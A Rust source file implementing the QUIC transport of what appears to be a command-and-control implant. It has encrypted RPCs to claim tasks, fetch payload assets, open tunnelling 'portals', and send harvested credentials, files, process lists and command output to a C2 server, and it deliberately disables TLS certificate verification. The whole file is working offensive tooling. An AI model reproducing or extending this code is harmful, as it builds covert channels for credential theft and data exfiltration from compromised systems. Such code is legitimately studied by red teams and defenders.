use crate::Transport;
use anyhow::{anyhow, Result};
use bytes::BytesMut;
use pb::{c2::*, config::Config};
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};
use std::sync::Arc;
use tokio::sync::Mutex;

/// gRPC frame header utilities for encoding/decoding wire protocol frames
mod grpc_frame {
    use bytes::{Buf, BytesMut};

    /// Size of gRPC frame header: [compression_flag(1)][length(4)]
    const FRAME_HEADER_SIZE: usize = 5;

    #[derive(Debug, Clone, Copy)]
    pub struct FrameHeader {
        pub compression_flag: u8,
        pub message_length: u32,
    }

    impl FrameHeader {
        /// Create a new frame header with no compression
        pub fn new(message_length: u32) -> Self {
            Self {
                compression_flag: 0x00,
                message_length,
            }
        }

        /// Encode frame header to 5-byte array
        pub fn encode(&self) -> [u8; FRAME_HEADER_SIZE] {
            let mut header = [0u8; FRAME_HEADER_SIZE];
            header[0] = self.compression_flag;
            header[1..5].copy_from_slice(&self.message_length.to_be_bytes());
            header
        }

        /// Try to decode frame header from buffer
        /// Returns None if buffer doesn't have enough data
        pub fn try_decode(buffer: &BytesMut) -> Option<Self> {
            if buffer.len() < FRAME_HEADER_SIZE {
                return None;
            }

            let compression_flag = buffer[0];
            let message_length = u32::from_be_bytes([buffer[1], buffer[2], buffer[3], buffer[4]]);

            Some(Self {
                compression_flag,
                message_length,
            })
        }

        /// Extract a complete frame from the buffer
        /// Returns None if frame is incomplete
        pub fn extract_frame(buffer: &mut BytesMut) -> Option<(Self, BytesMut)> {
            let header = Self::try_decode(buffer)?;
            let total_size = FRAME_HEADER_SIZE + header.message_length as usize;

            if buffer.len() < total_size {
                return None;
            }

            // Skip the header
            buffer.advance(FRAME_HEADER_SIZE);

            // Extract the message
            let message = buffer.split_to(header.message_length as usize);

            Some((header, message))
        }
    }
}

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";

struct Inner {
    endpoint: Option<quinn::Endpoint>,
    connection: Option<quinn::Connection>,
}

#[allow(clippy::upper_case_acronyms)]
#[derive(Clone)]
pub struct QuicTransport {
    inner: Arc<Mutex<Inner>>,
    uri: String,
}

impl std::fmt::Debug for QuicTransport {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("QuicTransport")
            .field("uri", &self.uri)
            .finish_non_exhaustive()
    }
}

impl QuicTransport {
    async fn get_connection(&self) -> Result<quinn::Connection> {
        let mut inner = self.inner.lock().await;
        if let Some(conn) = &inner.connection {
            if conn.close_reason().is_none() {
                return Ok(conn.clone());
            }
        }

        let addr_str = self
            .uri
            .strip_prefix("quic://")
            .or_else(|| self.uri.strip_prefix("quics://"))
            .unwrap_or(&self.uri);

        let addr: std::net::SocketAddr =
            if let Ok(parsed) = addr_str.parse::<std::net::SocketAddr>() {
                parsed
            } else {
                use std::net::ToSocketAddrs;
                addr_str
                    .to_socket_addrs()
                    .or_else(|_| format!("{}:443", addr_str).to_socket_addrs())
                    .map_err(|e| anyhow!("failed to resolve server address '{}': {}", addr_str, e))?
                    .next()
                    .ok_or_else(|| anyhow!("no IP address found for server '{}'", addr_str))?
            };
        let hostname = addr_str.split(':').next().unwrap_or("localhost");

        let endpoint = if let Some(ep) = &inner.endpoint {
            ep.clone()
        } else {
            let mut ep = quinn::Endpoint::client("0.0.0.0:0".parse().unwrap())?;

            let mut tls_config = rustls::ClientConfig::builder_with_provider(std::sync::Arc::new(
                rustls::crypto::ring::default_provider(),
            ))
            .with_safe_default_protocol_versions()
            .expect("failed to set default protocol versions")
            .dangerous()
            .with_custom_certificate_verifier(std::sync::Arc::new(
                crate::tls_utils::AcceptAllCertVerifier,
            ))
            .with_no_client_auth();

            tls_config.alpn_protocols = vec![b"realm-quic".to_vec()];

            let quic_config = quinn::crypto::rustls::QuicClientConfig::try_from(tls_config)
                .map_err(|e| anyhow!("Failed to build QUIC config: {}", e))?;

            ep.set_default_client_config(quinn::ClientConfig::new(std::sync::Arc::new(
                quic_config,
            )));
            inner.endpoint = Some(ep.clone());
            ep
        };

        let connecting = endpoint.connect(addr, hostname)?;
        let connection = connecting.await?;
        inner.connection = Some(connection.clone());
        Ok(connection)
    }

    async fn unary_rpc<Req, Resp>(&self, request: Req, path: &str) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        let request_bytes = pb::xchacha::encode_with_chacha::<Req, Resp>(request)?;
        let connection = self.get_connection().await?;
        let (mut send, mut recv) = connection.open_bi().await?;

        // 1. Write path
        let path_bytes = path.as_bytes();
        let path_len = path_bytes.len() as u16;
        send.write_all(&path_len.to_be_bytes()).await?;
        send.write_all(path_bytes).await?;

        // 2. Write request payload
        send.write_all(&request_bytes).await?;
        send.finish()?;

        // 3. Read response
        let response_bytes = recv.read_to_end(10485760).await?;

        // 4. Decrypt & decode
        let response_msg = pb::xchacha::decode_with_chacha::<Req, Resp>(&response_bytes)?;
        Ok(response_msg)
    }

    async fn read_stream_chunk(
        recv: &mut quinn::RecvStream,
        buffer: &mut BytesMut,
    ) -> Result<Option<Vec<u8>>> {
        loop {
            if let Some((_header, message)) = grpc_frame::FrameHeader::extract_frame(buffer) {
                return Ok(Some(message.to_vec()));
            }

            let mut chunk = vec![0u8; 32768];
            match recv.read(&mut chunk).await? {
                Some(n) => {
                    buffer.extend_from_slice(&chunk[..n]);
                }
                #[allow(non_snake_case) /* None is a reserved keyword */]
                None => {
                    if buffer.is_empty() {
                        return Ok(None);
                    } else {
                        return Err(anyhow!("Stream closed with incomplete frame"));
                    }
                }
            }
        }
    }

    async fn handle_portal_streaming(
        &self,
        mut rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        let connection = self.get_connection().await?;
        let (mut send, mut recv) = connection.open_bi().await?;

        let path_bytes = CREATE_PORTAL_PATH.as_bytes();
        let path_len = path_bytes.len() as u16;
        send.write_all(&path_len.to_be_bytes()).await?;
        send.write_all(path_bytes).await?;

        let mut send_stream = send;
        let upload_task = tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                let request_bytes = match pb::xchacha::encode_with_chacha::<
                    CreatePortalRequest,
                    CreatePortalResponse,
                >(msg)
                {
                    Ok(bytes) => bytes,
                    Err(_err) => {
                        #[cfg(feature = "print_debug")]
                        log::error!("Failed to marshal portal request: {}", _err);
                        break;
                    }
                };
                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
                if send_stream.write_all(&frame_header.encode()).await.is_err() {
                    break;
                }
                if send_stream.write_all(&request_bytes).await.is_err() {
                    break;
                }
            }
            let _ = send_stream.finish();
        });

        let mut buffer = BytesMut::new();
        while let Some(message_bytes) = Self::read_stream_chunk(&mut recv, &mut buffer).await? {
            let response_msg = pb::xchacha::decode_with_chacha::<
                CreatePortalRequest,
                CreatePortalResponse,
            >(&message_bytes)?;
            if tx.send(response_msg).await.is_err() {
                break;
            }
        }

        let _ = upload_task.await;
        Ok(())
    }
}

#[async_trait::async_trait]
impl Transport for QuicTransport {
    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
        Box::new(self.clone())
    }

    fn init() -> Self {
        QuicTransport {
            inner: Arc::new(Mutex::new(Inner {
                endpoint: None,
                connection: None,
            })),
            uri: String::new(),
        }
    }

    fn new(config: Config) -> Result<Self> {
        let uri = crate::transport::extract_uri_from_config(&config)?;
        Ok(Self {
            inner: Arc::new(Mutex::new(Inner {
                endpoint: None,
                connection: None,
            })),
            uri,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.unary_rpc(request, CLAIM_TASKS_PATH).await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        let request_bytes =
            pb::xchacha::encode_with_chacha::<FetchAssetRequest, FetchAssetResponse>(request)?;
        let connection = self.get_connection().await?;
        let (mut send, mut recv) = connection.open_bi().await?;

        let path_bytes = FETCH_ASSET_PATH.as_bytes();
        let path_len = path_bytes.len() as u16;
        send.write_all(&path_len.to_be_bytes()).await?;
        send.write_all(path_bytes).await?;

        send.write_all(&request_bytes).await?;
        send.finish()?;

        let mut buffer = BytesMut::new();
        while let Some(message_bytes) = Self::read_stream_chunk(&mut recv, &mut buffer).await? {
            let response_msg = pb::xchacha::decode_with_chacha::<
                FetchAssetRequest,
                FetchAssetResponse,
            >(&message_bytes)?;
            if tx.send(response_msg).is_err() {
                break;
            }
        }

        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.unary_rpc(request, REPORT_CREDENTIAL_PATH).await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let connection = self.get_connection().await?;
        let (mut send, mut recv) = connection.open_bi().await?;

        let path_bytes = REPORT_FILE_PATH.as_bytes();
        let path_len = path_bytes.len() as u16;
        send.write_all(&path_len.to_be_bytes()).await?;
        send.write_all(path_bytes).await?;

        for req_chunk in request {
            let request_bytes = pb::xchacha::encode_with_chacha::<
                ReportFileRequest,
                ReportFileResponse,
            >(req_chunk)?;
            let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
            send.write_all(&frame_header.encode()).await?;
            send.write_all(&request_bytes).await?;
        }
        send.finish()?;

        let response_bytes = recv.read_to_end(10485760).await?;

        let response_msg = pb::xchacha::decode_with_chacha::<ReportFileRequest, ReportFileResponse>(
            &response_bytes,
        )?;
        Ok(response_msg)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
    }

    async fn report_output(
        &mut self,
        request: ReportOutputRequest,
    ) -> Result<ReportOutputResponse> {
        self.unary_rpc(request, REPORT_OUTPUT_PATH).await
    }

    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        let transport = self.clone();
        tokio::spawn(async move {
            if let Err(_err) = transport.handle_portal_streaming(rx, tx).await {
                #[cfg(feature = "print_debug")]
                log::error!("create_portal streaming ended: {}", _err);
            }
        });
        Ok(())
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        pb::c2::transport::Type::TransportQuic
    }

    fn is_active(&self) -> bool {
        !self.uri.is_empty()
    }

    fn name(&self) -> &'static str {
        "quic"
    }

    fn list_available(&self) -> Vec<String> {
        vec!["quic".to_string()]
    }

    async fn forward_raw(
        &mut self,
        path: String,
        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> anyhow::Result<()> {
        let connection = self.get_connection().await?;
        let (mut send, mut recv) = connection.open_bi().await?;

        let path_bytes = path.as_bytes();
        let path_len = path_bytes.len() as u16;
        send.write_all(&path_len.to_be_bytes()).await?;
        send.write_all(path_bytes).await?;

        let parts: Vec<&str> = path.split('/').collect();
        let method_name = *parts.get(2).unwrap_or(&"");

        match method_name {
            "ClaimTasks" | "ReportCredential" | "ReportProcessList" | "ReportOutput" => {
                let req_bytes = rx
                    .recv()
                    .await
                    .ok_or_else(|| anyhow!("No input for unary call"))?;
                send.write_all(&req_bytes).await?;
                send.finish()?;

                let response_bytes = recv.read_to_end(10485760).await?;
                tx.send(response_bytes)
                    .await
                    .map_err(|e| anyhow!("Send failed: {}", e))?;
            }
            "FetchAsset" => {
                let req_bytes = rx
                    .recv()
                    .await
                    .ok_or_else(|| anyhow!("No input for FetchAsset"))?;
                send.write_all(&req_bytes).await?;
                send.finish()?;

                let mut buffer = BytesMut::new();
                while let Some(message_bytes) =
                    Self::read_stream_chunk(&mut recv, &mut buffer).await?
                {
                    tx.send(message_bytes)
                        .await
                        .map_err(|e| anyhow!("Send failed: {}", e))?;
                }
            }
            "ReportFile" => {
                let mut send_stream = send;
                let upload_task = tokio::spawn(async move {
                    while let Some(req_chunk) = rx.recv().await {
                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
                        if send_stream.write_all(&frame_header.encode()).await.is_err() {
                            break;
                        }
                        if send_stream.write_all(&req_chunk).await.is_err() {
                            break;
                        }
                    }
                    let _ = send_stream.finish();
                });

                let response_bytes = recv.read_to_end(10485760).await?;
                tx.send(response_bytes)
                    .await
                    .map_err(|e| anyhow!("Send failed: {}", e))?;

                let _ = upload_task.await;
            }
            "CreatePortal" => {
                let mut send_stream = send;
                let upload_task = tokio::spawn(async move {
                    while let Some(req_chunk) = rx.recv().await {
                        let frame_header = grpc_frame::FrameHeader::new(req_chunk.len() as u32);
                        if send_stream.write_all(&frame_header.encode()).await.is_err() {
                            break;
                        }
                        if send_stream.write_all(&req_chunk).await.is_err() {
                            break;
                        }
                    }
                    let _ = send_stream.finish();
                });

                let mut buffer = BytesMut::new();
                while let Some(message_bytes) =
                    Self::read_stream_chunk(&mut recv, &mut buffer).await?
                {
                    if tx.send(message_bytes).await.is_err() {
                        break;
                    }
                }

                let _ = upload_task.await;
            }
            _ => {
                return Err(anyhow!(
                    "Unsupported QUIC method for raw forwarding: {}",
                    method_name
                ));
            }
        }
        Ok(())
    }
}
